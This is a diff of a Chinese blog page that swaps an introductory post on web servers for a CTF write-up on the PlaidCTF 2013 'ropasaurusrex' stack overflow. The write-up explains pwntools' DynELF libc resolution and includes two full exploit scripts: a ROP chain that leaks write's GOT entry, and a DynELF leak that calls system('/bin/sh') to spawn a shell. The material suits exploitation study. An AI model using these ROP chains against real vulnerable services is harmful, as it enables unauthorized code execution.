@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>什么是web_server | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" webpwn ">
-  <meta name="description" content="什么是web_server | sixpar&#39;s blog">
+  <title>plaidctf-2013-ropasaurusrex(DynELF) | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" ROP , DynELF ">
+  <meta name="description" content="plaidctf-2013-ropasaurusrex(DynELF) | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="介绍：对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移各不相同；如果题目不提供libc，我们通过泄露任意一个库函数地址就无法推算出system函数地址，（因为没有libc版本，不知道与system函数之间的偏移） 所以我们就要想办法获取目标系统的libc的版本，这里介绍一种获取远程libc版本的方法：dynELF。 DynELF就是通过程序漏洞泄露出任意地址内容，结合ELF文件">
 <meta property="og:type" content="article">
@@ -546,9 +546,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-什么是web-server" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-plaidctf-2013-ropasaurusrex-DynELF" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">什么是web_server</h1>
+        <h1 class="article-title">plaidctf-2013-ropasaurusrex(DynELF)</h1>
     
     <div class="article-meta">
         
@@ -558,7 +558,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="学习">学习</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -566,19 +566,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">webpwn</a>
+            <a class="color4">ROP</a>
+            
+            <a class="color2">DynELF</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 21:49:03'>2020-07-05 21:37</time>
+            Created At : <time class="date" title='Updated At: 2020-07-12 22:39:22'>2020-07-12 22:13</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:693</span>
+        <span>Count:1.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -608,7 +610,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是-server-？"><span class="toc-text">什么是 server ？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是-Web-Server？"><span class="toc-text">什么是 Web Server？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何提供-HTTP-服务？"><span class="toc-text">如何提供 HTTP 服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提供HTTP服务的web-server分类"><span class="toc-text">提供HTTP服务的web server分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-静态文件服务器"><span class="toc-text">1. 静态文件服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-动态内容服务器"><span class="toc-text">2. 动态内容服务器</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload样式："><span class="toc-text">payload样式：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题：plaidctf-2013-ropasaurusrex"><span class="toc-text">例题：plaidctf-2013 - ropasaurusrex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#做法一："><span class="toc-text">做法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法二："><span class="toc-text">做法二：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -624,39 +626,78 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>今晚突然想了解一下什么是 web server pwn</p>
+        <h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移各不相同；如果题目不提供libc，我们通过泄露任意一个库函数地址就无法推算出system函数地址，（因为没有libc版本，不知道与system函数之间的偏移）</p>
+<p>所以我们就要想办法获取目标系统的libc的版本，这里介绍一种获取远程libc版本的方法：dynELF。</p>
+<p>DynELF就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号（比如system）在内存中的地址</p>
+<p>也就是说，若程序没有 libc，但却有任意地址内存泄露函数（比如puts，write等）的情况下，可以利用DynELF 解析任意加载库的任意符号地址。（其中涉及ELF文件中的 hash表，动态符号表，字符串表，Dynamic段，link_map结构）</p>
+<h2 id="payload样式："><a href="#payload样式：" class="headerlink" title="payload样式："></a>payload样式：</h2><p>payload样式如下:</p>
+<pre><code class="python">def leak(address):
+    #泄露
+    payload1 = &#39;a&#39;*(paddings) + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    return data  #返回泄露的数据
+
+d=DynELF(leak,elf=ELF(&#39;./filename&#39;))   
+#使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d
+system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)   
+#通过这个实例d的lookup方法来搜寻libc库函数，找到system的字符，得到地址</code></pre>
+<p>可见leak函数中前提是必须实现一个基本的<code>泄露</code>功能。</p>
+<p>我们这里使用的是write函数。构造基本的ROP链：填充paddings垃圾数据返回地址覆盖为write函数的plt地址，参数什么的也事先压入栈中，write_plt执行完后再次跳转到漏洞点，使得能重复利用溢出漏洞进行打印泄露地址。</p>
+<p>其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。由于DynELF方法会多次调用leak函数，所以这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等；<br>通过实践发现 <code>write</code> 函数是最理想的，因为write函数的特点在于其<code>输出完全由其参数size决定</code>，只要目标地址可读，size填多少就输出多少，<code>不会受到诸如‘\0’, ‘\n’之类的字符影响</code>；而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>
+<h2 id="例题：plaidctf-2013-ropasaurusrex"><a href="#例题：plaidctf-2013-ropasaurusrex" class="headerlink" title="例题：plaidctf-2013 - ropasaurusrex"></a>例题：plaidctf-2013 - ropasaurusrex</h2><p>本题貌似没有给出远程的libc，不过本地使用libc.so.6能打通。</p>
+<h3 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h3><blockquote>
+<p>Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)</p>
 </blockquote>
-<h2 id="什么是-server-？"><a href="#什么是-server-？" class="headerlink" title="什么是 server ？"></a>什么是 server ？</h2><p>一般来说 server （服务器）有两重意思</p>
-<blockquote>
-<ul>
-<li>1.表示硬件，也就是一台机器。它还有另一个名字：「主机」。</li>
-<li>2.表示软件程序，这种程序主要用来对外提供某些服务，比如邮件服务、FTP 服务、数据库服务、网页服务等。</li>
-</ul>
-</blockquote>
-<p>作为开发者，我们说 server 的时候，一般指的后者，也就是一个 24 小时运行的软件程序。而一台主机上面可以运行多个这样的程序。</p>
-<h2 id="什么是-Web-Server？"><a href="#什么是-Web-Server？" class="headerlink" title="什么是 Web Server？"></a>什么是 Web Server？</h2><p>顾名思义Web Server 就是<code>提供 Web 服务的 Server</code>。<br>比如我们访问 <a href="http://baidu.com，其实就是在使用百度的" target="_blank" rel="noopener">http://baidu.com，其实就是在使用百度的</a> Server 提供的web服务。</p>
-<p>web server的主要功能是：<code>存储，处理和传递网页给客户</code></p>
-<p>它只需支持HTTP协议、HTML文档格式及URL，与客户端的网络浏览器配合。因为Web服务器主要支持的协议就是HTTP，所以通常情况下HTTP服务器和WEB服务器是相等的(有没有支持除HTTP之外的协议的web服务器，没有考证过）<br>所以 Web Server 一般对外提供的是 HTTP 服务（也可以是其他服务），这就是为什么我们的网址都以「http://」开头。</p>
-<h2 id="如何提供-HTTP-服务？"><a href="#如何提供-HTTP-服务？" class="headerlink" title="如何提供 HTTP 服务？"></a>如何提供 HTTP 服务？</h2><p>下面是用 Node.js 写的一个最简单的 HTTP server：</p>
-<pre><code class="javascript">// 文件名 index.js
-// 使用 node index.js 即可运行本程序
+<h3 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h3><p>程序简简单单，执行一个read函数后打印‘win’，程序结束，呃呃呃。<br>read函数存在栈溢出漏洞，buf大小是0x88h，而能输入0x100</p>
+<p>有两种做法，一种是简单ROP，另一种是比较复杂的DynELF。</p>
+<h4 id="做法一："><a href="#做法一：" class="headerlink" title="做法一："></a>做法一：</h4><p>简单ROP：</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./ropasaurusrex&#39;)
+elf=ELF(&#39;./ropasaurusrex&#39;)
+libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+write_plt=elf.plt[&#39;write&#39;]
+write_got=elf.got[&#39;write&#39;]
+vuln_addr=0x80483F4
+payload=&#39;a&#39;*140+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)
+p.sendline(payload)
+write_addr=u32(p.recv(4))
+print &quot;write_addr :&quot;+hex(write_addr)
+libc_base=write_addr-libc.symbols[&#39;write&#39;]
+sys_addr=libc_base+libc.symbols[&#39;system&#39;]
+bin_addr=libc_base+libc.search(&#39;/bin/sh\x00&#39;).next()
+# write down ,retn to vuln_addr 
+# read again !
+payload1=&#39;a&#39;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)
+p.sendline(payload1)
+p.interactive()</code></pre>
+<p>exp就不解释了，感觉是最基本的ROP题目了。</p>
+<h4 id="做法二："><a href="#做法二：" class="headerlink" title="做法二："></a>做法二：</h4><pre><code class="python">from pwn import *
+pro = &#39;./ropasaurusrex&#39;
+p = process(pro)
+elf = ELF(pro)
+start_addr = 0x8048340
 
-var http = require(&#39;http&#39;)
+def leak(addr):
+    payload = &#39;a&#39;*(0x88+4) + p32(elf.plt[&#39;write&#39;]) + p32(start_addr)  # retn to start_addr
+    payload+= p32(1) + p32(addr) + p32(8)  # args of write
+    # we leak All of ELF file&#39;s addr !?
+    p.sendline(payload)
+    context = p.recv(8)
+    print(&quot;%#x -&gt; %s&quot; %(addr, (context or &#39;&#39;).encode(&#39;hex&#39;)))   #print
+    return context
 
-var server = http.createServer( function (request, response){
-    response.end(&#39;这是页面内容，你请求的路径是：&#39; + request.url)
-})
+d = DynELF(leak,elf = elf)
+system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)  # look for &#39;system&#39; from context
+read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)
+print &quot;system_addr: &quot; + hex(system_addr)
+print &quot;read_addr: &quot; + hex(read_addr)
 
-server.listen(8080, function(){
-    console.log(&quot;正在监听 %s 端口&quot;, 8080);
-});</code></pre>
-<p>这就是一个最简单的 HTTP server。<br>你不用看懂这段程序，你只需要知道两件事情：<br>1.这段程序监听了当前机器的 8080 端口。<br>2.一旦外部访问当前机器的 8080 端口，这段程序就会返回一段文字。</p>
-<h2 id="提供HTTP服务的web-server分类"><a href="#提供HTTP服务的web-server分类" class="headerlink" title="提供HTTP服务的web server分类"></a>提供HTTP服务的web server分类</h2><p>提供 HTTP 服务的 web server 分为两类。</p>
-<h3 id="1-静态文件服务器"><a href="#1-静态文件服务器" class="headerlink" title="1. 静态文件服务器"></a>1. 静态文件服务器</h3><p>这种服务器简单地根据访问路径，<code>返回对应路径下的文件</code>。</p>
-<p>比如用户访问 http:// 123.123.123.123:8080/a/b/c/d.html，那么这种服务器就会在网站根目录找到 a/b/c/d.html 文件，原样返回给用户。</p>
-<h3 id="2-动态内容服务器"><a href="#2-动态内容服务器" class="headerlink" title="2. 动态内容服务器"></a>2. 动态内容服务器</h3><p>这种服务器返回的内容一般不是文件，而是<code>动态生成的字符串</code>（比如从数据库中获取的字符串）。</p>
-<p>比如用户访问 http:// <a href="http://weibo.com/home，那么这种" target="_blank" rel="noopener">http://weibo.com/home，那么这种</a> <a href="http://weibo.com" target="_blank" rel="noopener">http://weibo.com</a> 的服务器则会返回当前用户最新的消息。显然<code>每个用户得到的内容是不一样的</code>。</p>
+p.sendline(&#39;a&#39;*(0x88+4) + p32(read_addr) + p32(system_addr) + p32(0) + p32(elf.bss()+100) + p32(8))
+p.sendline(&#39;/bin/sh\x00&#39;) # read &#39;/bin/sh&#39; to  bss+100
+p.interactive()</code></pre>
+<p>exp运行起来后，会打印ELF文件的内存。然后再去寻找‘system’字符。<br>不过这里是调用read函数读取binsh字符串到bss段上。手法值得学习。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>什么时候选择DynELF方法？<br>程序里得有write（最好是write，输出大小只由size决定）等输出函数，且可以反复调用（不能调用后就崩了）。DynELF找的是字符串。得注意有时候程序里没有/bin/sh字符串，我们就可以计算read函数地址，然后方便我们写入binsh字符串到bss+100（这个地址随便的吧）上。然后调用system。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
